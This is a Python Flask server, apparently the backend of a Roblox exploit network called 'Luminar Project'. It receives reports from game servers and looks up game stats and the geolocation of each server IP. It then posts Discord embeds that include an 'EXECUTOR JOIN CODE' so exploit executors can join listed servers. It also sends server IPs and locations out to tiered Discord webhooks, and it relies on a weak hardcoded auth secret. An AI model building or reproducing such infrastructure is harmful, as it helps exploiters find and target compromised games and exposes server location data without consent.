import os, hashlib, time, requests, logging
from flask import Flask, request, jsonify
from collections import deque
from threading import Lock

app = Flask(__name__)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("LuminarProject")

AUTH_SECRET = "Luminar"
WEBHOOKS = {
    "tier1": os.environ.get('WEBHOOK_0_20'),      # 0-20 players
    "tier2": os.environ.get('WEBHOOK_20_50'),     # 20-50 players
    "tier3": os.environ.get('WEBHOOK_50_100'),    # 50-100 players
    "tier4": os.environ.get('WEBHOOK_100_500'),   # 100-500 players
    "tier5": os.environ.get('WEBHOOK_500_PLUS')   # 500+ players
}

# Log webhook URLs on startup
logger.info("=" * 50)
logger.info("WEBHOOK CONFIGURATION:")
logger.info(f"Tier 1 (0-20): {'SET' if WEBHOOKS['tier1'] else 'NOT SET'}")
logger.info(f"Tier 2 (20-50): {'SET' if WEBHOOKS['tier2'] else 'NOT SET'}")
logger.info(f"Tier 3 (50-100): {'SET' if WEBHOOKS['tier3'] else 'NOT SET'}")
logger.info(f"Tier 4 (100-500): {'SET' if WEBHOOKS['tier4'] else 'NOT SET'}")
logger.info(f"Tier 5 (500+): {'SET' if WEBHOOKS['tier5'] else 'NOT SET'}")
logger.info("=" * 50)

webhook_queues = {}
webhook_locks = {}

def rate_limited_webhook(webhook_url, payload):
    if webhook_url not in webhook_queues:
        webhook_queues[webhook_url] = deque(maxlen=5)
        webhook_locks[webhook_url] = Lock()
    
    with webhook_locks[webhook_url]:
        now = time.time()
        while webhook_queues[webhook_url] and now - webhook_queues[webhook_url][0] > 5:
            webhook_queues[webhook_url].popleft()
        
        if len(webhook_queues[webhook_url]) >= 5:
            sleep_time = 5 - (now - webhook_queues[webhook_url][0])
            if sleep_time > 0:
                logger.info(f"⏳ Waiting {sleep_time:.1f}s for rate limit")
                time.sleep(sleep_time)
                webhook_queues[webhook_url].popleft()
        
        webhook_queues[webhook_url].append(time.time())
        return requests.post(webhook_url, json=payload, timeout=5)

def get_location(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        if res.get('status') == 'success':
            return f"📍 {res['city']}, {res['country']} ({res['isp']})"
    except: pass
    return "Unknown Location"

def verify_luminar_security(provided_hash):
    if not provided_hash:
        return False
        
    current_min = time.gmtime().tm_min
    minutes_to_check = [current_min, (current_min - 1) % 60, (current_min - 2) % 60]
    
    for m in minutes_to_check:
        raw_string = f"{AUTH_SECRET}:{m}"
        expected = hashlib.sha256(raw_string.encode()).hexdigest()
        if provided_hash == expected:
            return True
    
    return False

def format_number(n):
    if isinstance(n, (int, float)):
        return f"{n:,}"
    return "0"

@app.route('/webhook', methods=['POST'])
def handle_webhook():
    data = request.json
    provided_hash = request.headers.get('X-Luminar-Auth')
    
    place_id = data.get('placeId')
    job_id = data.get('jobId')
    player_count = data.get('playerCount', 0)
    max_players = data.get('maxPlayers', 0)
    
    logger.info(f"📥 Request | Place: {place_id}")

    if not verify_luminar_security(provided_hash):
        return jsonify({"error": "Unauthorized"}), 401

    try:
        server_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
        
        # Step 1: Get Universe ID
        universe_res = requests.get(f"https://apis.roblox.com/universes/v1/places/{place_id}/universe", timeout=5)
        
        if universe_res.status_code != 200:
            logger.warning(f"⚠️ Universe API returned {universe_res.status_code}")
            return jsonify({"status": "skipped"}), 200
            
        universe_id = universe_res.json().get('universeId')
        
        if not universe_id:
            logger.error(f"❌ No universeId for {place_id}")
            return jsonify({"status": "skipped"}), 200
        
        # Step 2: Get game details
        game_res = requests.get(f"https://games.roblox.com/v1/games?universeIds={universe_id}", timeout=5)
        
        if game_res.status_code == 403:
            logger.warning(f"⚠️ Roblox blocked (403) - skipping")
            return jsonify({"status": "skipped"}), 200
        
        if game_res.status_code != 200:
            logger.warning(f"⚠️ Game API returned {game_res.status_code}")
            return jsonify({"status": "skipped"}), 200
        
        game_json = game_res.json()
        if 'data' not in game_json or len(game_json['data']) == 0:
            logger.warning(f"⚠️ No game data")
            return jsonify({"status": "skipped"}), 200
            
        game_data = game_json['data'][0]
        
        game_name = game_data.get('name', 'Unknown')
        game_desc = game_data.get('description', '') or ''
        playing = game_data.get('playing', 0)
        visits = game_data.get('visits', 0)
        favorites = game_data.get('favoritedCount', 0)
        updated = game_data.get('updated', 'Unknown')
        
        logger.info(f"✅ {game_name} | {playing} active players")
        
        # Step 3: Get votes
        upvotes = 0
        try:
            votes_res = requests.get(f"https://games.roblox.com/v1/games/votes?universeIds={universe_id}", timeout=5)
            if votes_res.status_code == 200:
                votes_json = votes_res.json()
                if 'data' in votes_json and len(votes_json['data']) > 0:
                    upvotes = votes_json['data'][0].get('upVotes', 0)
        except:
            pass
        
        # Step 4: Get thumbnail
        thumbnail_url = "https://via.placeholder.com/768x432"
        try:
            thumb_res = requests.get(f"https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds={universe_id}&countPerUniverse=1&defaults=true&size=768x432&format=Png&isCircular=false", timeout=5)
            if thumb_res.status_code == 200:
                thumb_json = thumb_res.json()
                if 'data' in thumb_json and len(thumb_json['data']) > 0:
                    thumbs = thumb_json['data'][0].get('thumbnails', [])
                    if thumbs:
                        thumbnail_url = thumbs[0]['imageUrl']
        except:
            pass
        
        # Step 5: Get icon
        icon_url = "https://via.placeholder.com/256"
        try:
            icon_res = requests.get(f"https://thumbnails.roblox.com/v1/games/icons?universeIds={universe_id}&size=256x256&format=Png&isCircular=false", timeout=5)
            if icon_res.status_code == 200:
                icon_json = icon_res.json()
                if 'data' in icon_json and len(icon_json['data']) > 0:
                    icon_url = icon_json['data'][0]['imageUrl']
        except:
            pass
        
        # Tiered webhook (0-20, 20-50, 50-100, 100-500, 500+)
        if playing >= 500:
            target = WEBHOOKS["tier5"]
            tier_name = "🔴 Tier 5 (500+)"
            tier_color = 0xFF0000  # Red
        elif playing >= 100:
            target = WEBHOOKS["tier4"]
            tier_name = "🟠 Tier 4 (100-500)"
            tier_color = 0xFF6B00  # Orange
        elif playing >= 50:
            target = WEBHOOKS["tier3"]
            tier_name = "🟡 Tier 3 (50-100)"
            tier_color = 0xFFD700  # Gold
        elif playing >= 20:
            target = WEBHOOKS["tier2"]
            tier_name = "🟢 Tier 2 (20-50)"
            tier_color = 0x00FF00  # Green
        else:
            target = WEBHOOKS["tier1"]
            tier_name = "🔵 Tier 1 (0-20)"
            tier_color = 0x0099FF  # Blue

        logger.info(f"🎯 Using {tier_name} for {playing} players")

        if not target:
            logger.error(f"❌ No webhook URL set for {tier_name}!")
            return jsonify({"error": "No webhook configured"}), 500

        # Build embed with enhanced info
        js_code = f"```js\nRoblox.GameLauncher.joinGameInstance({place_id}, \"{job_id}\");\n```"
        
        desc_text = game_desc[:250] + "..." if len(game_desc) > 250 else game_desc
        
        # Calculate engagement metrics
        engagement_rate = ((upvotes + favorites) / (visits + 1)) * 100 if visits > 0 else 0
        players_percentage = (player_count / max_players * 100) if max_players > 0 else 0
        
        # Player status indicator
        if player_count == max_players:
            status_indicator = "🔴 FULL"
        elif players_percentage >= 80:
            status_indicator = "🟠 ALMOST FULL"
        elif players_percentage >= 50:
            status_indicator = "🟡 MEDIUM"
        else:
            status_indicator = "🟢 AVAILABLE"
        
        payload = {
            "embeds": [{
                "author": {
                    "name": "⚡ LUMINAR PROJECT | SERVER INTELLIGENCE",
                    "icon_url": icon_url,
                    "url": f"https://www.roblox.com/games/{place_id}"
                },
                "title": f"🎮 {game_name}",
                "url": f"https://www.roblox.com/games/{place_id}",
                "description": f"*{desc_text}*\n\n**SERVER TIER:** {tier_name}",
                "color": tier_color,
                "thumbnail": {"url": icon_url},
                "image": {"url": thumbnail_url},
                "fields": [
                    {
                        "name": "🌐 SERVER INFORMATION",
                        "value": f"**IP Address:** `{server_ip}`\n{get_location(server_ip)}\n**Server Status:** {status_indicator}",
                        "inline": False
                    },
                    {
                        "name": "👥 POPULATION METRICS",
                        "value": f"**Global Active:** {format_number(playing):>6}\n**Current Server:** {player_count}/{max_players} ({players_percentage:.1f}%)\n**Total Visits:** {format_number(visits):>6}",
                        "inline": True
                    },
                    {
                        "name": "⭐ ENGAGEMENT STATS",
                        "value": f"**Favorites:** {format_number(favorites):>6}\n**Upvotes:** {format_number(upvotes):>6}\n**Engagement:** {engagement_rate:.2f}%",
                        "inline": True
                    },
                    {
                        "name": "🔧 TECHNICAL DATA",
                        "value": f"**Place ID:** `{place_id}`\n**Universe ID:** `{universe_id}`\n**Job ID:** `{job_id}`",
                        "inline": True
                    },
                    {
                        "name": "📅 TIMESTAMP",
                        "value": f"**Last Updated:** {updated[:10]}\n**Detection Time:** {time.strftime('%Y-%m-%d %H:%M:%S')} UTC",
                        "inline": True
                    },
                    {
                        "name": "💻 EXECUTOR JOIN CODE",
                        "value": js_code,
                        "inline": False
                    },
                    {
                        "name": "🔗 QUICK LINKS",
                        "value": f"[🎮 Play Game](https://www.roblox.com/games/{place_id}) • [👀 Universe](https://www.roblox.com/universes/{universe_id}) • [📊 Analytics](https://www.roblox.com/games/{place_id}/analytics)",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": f"Luminar Intelligence System • Tier {tier_name} Detection",
                    "icon_url": icon_url
                }
            }]
        }

        logger.info(f"📤 Sending webhook to Discord...")
        res = rate_limited_webhook(target, payload)
        
        logger.info(f"📬 Discord response: {res.status_code}")
        if res.status_code in [200, 204]:
            logger.info(f"✅ Webhook delivered successfully!")
        elif res.status_code == 429:
            logger.warning(f"⚠️ Discord rate limited (429) - too many requests")
            logger.warning(f"⚠️ Response: {res.text}")
        else:
            logger.error(f"❌ Discord returned {res.status_code}: {res.text}")
        
        return jsonify({"status": "success"}), 200

    except Exception as e:
        logger.error(f"❌ Error: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
